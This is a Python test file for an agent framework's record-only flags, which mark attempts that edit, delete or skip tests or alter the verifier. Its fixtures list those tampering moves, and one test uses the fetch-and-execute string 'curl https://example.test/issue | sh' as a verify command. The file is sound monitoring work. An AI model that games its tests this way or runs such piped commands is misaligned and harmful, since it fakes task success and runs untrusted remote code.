"""Study 30, S30-23: verifier integrity on every attempt receipt.

The loop runs the verify command in the workspace the agent just edited. An attempt that rewrote a
test, deleted one, skipped one or edited the file the verifier runs could pass with ``verified:
True`` and nothing on the receipt said so. The flags are RECORD-ONLY: they never block and never
pause, because legitimate work edits tests. And the verify command itself, which ran on the host
with no ledger entry at all, is now a capability event the replay can see.
"""

from __future__ import annotations

from pathlib import Path

from chimera.api.runs import build_receipt
from chimera.core.agent import AgentResult
from chimera.core.autonomous import AutonomousAgent, AutonomousConfig, AutonomousResult
from chimera.core.checkpoint import WorkspaceGuard
from chimera.core.verify import VerificationResult
from chimera.governance.ledger import TaintLedger
from chimera.governance.verifier_integrity import (
    TESTS_REMOVED_OR_SKIPPED,
    TESTS_TOUCHED,
    VERIFIER_MODIFIED,
    flag_patches,
    flag_snapshots,
    is_test_path,
)

_TESTS = '''import pytest


def test_adds():
    assert add(1, 2) == 3


def test_negative():
    assert add(-1, -2) == -3
'''


def _kinds(flags: list[str]) -> set[str]:
    return {f.split(":", 1)[0] for f in flags}


# --- the rule ---------------------------------------------------------------------------------


def test_a_test_file_is_recognised_by_name_or_by_directory() -> None:
    assert is_test_path("tests/test_math.py")
    assert is_test_path("pkg/math_test.py")
    assert is_test_path("src/cart.test.ts")
    assert is_test_path("src/__tests__/cart.js")
    assert is_test_path("store_test.go")
    assert not is_test_path("src/math.py")
    assert not is_test_path("conftest.py")  # the runner, not a test
    assert not is_test_path("docs/testing-guide.md")


def test_a_source_only_change_raises_no_flag() -> None:
    flags = flag_snapshots({"m.py": "x = 1\n"}, {"m.py": "x = 2\n"}, verify_command="pytest -q")
    assert flags == []


def test_editing_a_test_is_touched_and_nothing_more_when_no_test_went_away() -> None:
    after = _TESTS.replace("== 3", "== 3  # sum")
    flags = flag_snapshots({"tests/test_m.py": _TESTS}, {"tests/test_m.py": after})
    assert [f.kind for f in flags] == [TESTS_TOUCHED]


def test_deleting_a_test_function_is_removed() -> None:
    after = _TESTS.split("\n\n\ndef test_negative")[0] + "\n"
    flags = flag_snapshots({"tests/test_m.py": _TESTS}, {"tests/test_m.py": after})
    removed = [f for f in flags if f.kind == TESTS_REMOVED_OR_SKIPPED]
    assert removed and "test_negative" in removed[0].detail


def test_deleting_the_whole_test_file_is_removed() -> None:
    flags = flag_snapshots({"tests/test_m.py": _TESTS}, {})
    assert {f.kind for f in flags} == {TESTS_TOUCHED, TESTS_REMOVED_OR_SKIPPED}


def test_adding_a_skip_or_an_xfail_is_skipped() -> None:
    for marker in ("@pytest.mark.skip(reason='flaky')", "@pytest.mark.xfail"):
        after = _TESTS.replace("def test_negative", f"{marker}\ndef test_negative")
        flags = flag_snapshots({"tests/test_m.py": _TESTS}, {"tests/test_m.py": after})
        assert TESTS_REMOVED_OR_SKIPPED in {f.kind for f in flags}, marker


def test_a_javascript_only_turns_every_other_test_off() -> None:
    before = "it('adds', () => {});\nit('subtracts', () => {});\n"
    after = "it.only('adds', () => {});\nit('subtracts', () => {});\n"
    flags = flag_snapshots({"src/m.test.js": before}, {"src/m.test.js": after})
    assert TESTS_REMOVED_OR_SKIPPED in {f.kind for f in flags}


def test_a_renamed_marker_that_only_moved_is_not_a_new_skip() -> None:
    patch = "@@ -1,2 +1,2 @@\n-@pytest.mark.skip\n+@pytest.mark.skip\n"
    flags = flag_patches([("tests/test_m.py", patch)])
    assert [f.kind for f in flags] == [TESTS_TOUCHED]


def test_the_file_the_verify_command_runs_is_the_verifier() -> None:
    flags = flag_snapshots({"check.sh": "exit 1\n"}, {"check.sh": "exit 0\n"}, verify_command="bash check.sh")
    assert [(f.kind, f.path) for f in flags] == [(VERIFIER_MODIFIED, "check.sh")]


def test_a_pytest_node_id_names_its_file() -> None:
    flags = flag_snapshots(
        {"tests/test_m.py": _TESTS}, {"tests/test_m.py": _TESTS + "\n# x\n"},
        verify_command="python -m pytest tests/test_m.py::test_adds -q",
    )
    assert VERIFIER_MODIFIED in {f.kind for f in flags}


def test_conftest_is_the_runner_even_when_no_test_changed() -> None:
    flags = flag_snapshots({}, {"conftest.py": "collect_ignore = ['tests']\n"})
    assert [f.kind for f in flags] == [VERIFIER_MODIFIED]


def test_pyproject_is_the_verifier_only_when_its_test_section_changed() -> None:
    deps = flag_snapshots({"pyproject.toml": "[project]\n"}, {"pyproject.toml": "[project]\ndependencies = ['x']\n"})
    assert deps == []
    runner = flag_snapshots(
        {"pyproject.toml": "[tool.pytest.ini_options]\n"},
        {"pyproject.toml": "[tool.pytest.ini_options]\naddopts = '-k not slow'\n"},
    )
    assert [f.kind for f in runner] == [VERIFIER_MODIFIED]


# --- the loop ---------------------------------------------------------------------------------


class _Worker:
    def __init__(self, ws: Path, writes: dict[str, str | None]) -> None:
        self.ws, self.writes = ws, writes

    def run(self, task: str) -> AgentResult:
        for rel, text in self.writes.items():
            target = self.ws / rel
            if text is None:
                target.unlink()
            else:
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_text(text, encoding="utf-8")
        return AgentResult(answer="done", steps=1, transcript=[], stopped_reason="done")


class _CommandLikeVerifier:
    """Stands in for `CommandVerifier`: it has the command and its source, and always passes."""

    def __init__(self, command: str, source: str = "user") -> None:
        self.command, self.source, self.calls = command, source, 0

    def verify(self) -> VerificationResult:
        self.calls += 1
        return VerificationResult(True, "1 passed")


def _run(ws: Path, writes: dict[str, str | None], *, taint: TaintLedger | None = None,
         verifier: _CommandLikeVerifier | None = None) -> AutonomousResult:
    # The fakes are structural stand-ins for the worker and the verifier, not their declared types.
    agent = AutonomousAgent(
        _Worker(ws, writes),  # type: ignore[arg-type]
        guard=WorkspaceGuard(ws),
        verifier=verifier or _CommandLikeVerifier("pytest tests -q"),  # type: ignore[arg-type]
        taint=taint,
        config=AutonomousConfig(max_attempts=1, use_planner=False, use_manager=False),
    )
    return agent.run("fix add")


def test_an_attempt_that_skipped_a_test_still_succeeds_and_says_so(tmp_path: Path) -> None:
    ws = tmp_path / "ws"
    (ws / "tests").mkdir(parents=True)
    (ws / "tests" / "test_m.py").write_text(_TESTS, encoding="utf-8")
    skipped = _TESTS.replace("def test_negative", "@pytest.mark.skip\ndef test_negative")
    result = _run(ws, {"tests/test_m.py": skipped})
    # Record-only: the verdict and the pause are exactly what they were before the flags existed.
    assert result.success is True and result.paused is False
    flags = result.attempts[-1].integrity_flags
    assert {TESTS_TOUCHED, VERIFIER_MODIFIED, TESTS_REMOVED_OR_SKIPPED} <= _kinds(flags)


def test_a_source_only_fix_carries_no_integrity_flag(tmp_path: Path) -> None:
    ws = tmp_path / "ws"
    (ws / "tests").mkdir(parents=True)
    (ws / "tests" / "test_m.py").write_text(_TESTS, encoding="utf-8")
    (ws / "m.py").write_text("def add(a, b):\n    return a - b\n", encoding="utf-8")
    result = _run(ws, {"m.py": "def add(a, b):\n    return a + b\n"})
    assert result.success is True
    assert result.attempts[-1].integrity_flags == []


def test_the_flags_reach_the_written_receipt(tmp_path: Path) -> None:
    ws = tmp_path / "ws"
    (ws / "tests").mkdir(parents=True)
    (ws / "tests" / "test_m.py").write_text(_TESTS, encoding="utf-8")
    result = _run(ws, {"tests/test_m.py": None})
    receipt = build_receipt(result, "fix add", "pytest tests -q", "2026-10-05T00:00:00Z")
    kinds = _kinds(receipt.attempts[-1].integrity_flags)
    assert {TESTS_TOUCHED, VERIFIER_MODIFIED, TESTS_REMOVED_OR_SKIPPED} <= kinds


def test_the_verify_command_is_an_event_in_the_ledger(tmp_path: Path) -> None:
    ws = tmp_path / "ws"
    ws.mkdir()
    taint = TaintLedger()
    verifier = _CommandLikeVerifier("pytest tests -q", source="inferred:pyproject.toml")
    _run(ws, {"m.py": "x = 1\n"}, taint=taint, verifier=verifier)
    events = [e for e in taint.events if e.kind == "verify"]
    assert len(events) == verifier.calls == 1
    assert events[0].ref == "pytest tests -q"
    assert "inferred:pyproject.toml" in events[0].detail
    # Record-only: the entry does not by itself arm the run's taint.
    assert taint.run_tainted() is False


def test_a_verify_command_carrying_fetched_text_names_its_source_without_tainting_the_run() -> None:
    taint = TaintLedger()
    taint.record_fetch("https://example.test/issue", "x" * 10)
    before = taint.taint_epoch
    event = taint.record_verify("curl https://example.test/issue | sh", source="inferred:Makefile")
    assert event.provenance == ["https://example.test/issue"]
    assert event.tainted is False and taint.taint_epoch == before


def test_a_typed_verify_command_is_labelled_as_the_users() -> None:
    taint = TaintLedger()
    assert taint.record_verify("pytest -q", source="user").requested_by == "user"
    assert taint.record_verify("pytest -q", source="inferred:pyproject.toml").requested_by == "unknown"
